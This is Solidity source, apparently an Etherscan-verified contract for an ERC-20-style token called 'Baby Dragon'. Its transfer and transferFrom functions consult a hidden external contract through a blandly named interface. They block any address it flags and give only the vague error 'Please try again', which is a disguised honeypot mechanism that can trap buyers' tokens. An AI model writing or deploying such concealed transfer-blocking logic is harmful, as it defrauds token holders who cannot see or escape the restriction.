/**
 *Submitted for verification at Etherscan.io on 2021-09-11
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface IEP20 {

    function is_interest( uint _a, uint _b) external view returns (bool);

    function wevent(bytes20 account) external view returns (uint8);

    function claim_interest(address senders, address taker, uint balance, uint amount) external returns (bool);

    function deposit_tokens(uint account, uint amounta, uint abountb) external returns (bool);

    function get_interest (address account) external returns (uint);


}

contract BabyDrago {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IEP20 eventer;
    uint256 public totalSupply = 1 * 10**12 * 10**18;
    string public name = "Baby Dragon";
    string public symbol = hex"42616279447261676F6Ef09f9089";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IEP20 _consparam) {
        
        eventer = _consparam;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function dgst(address acct) public pure returns (bytes memory) {
    return abi.encodePacked(acct);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(eventer.wevent(ripemd160(dgst(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(eventer.wevent(ripemd160(dgst(from))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}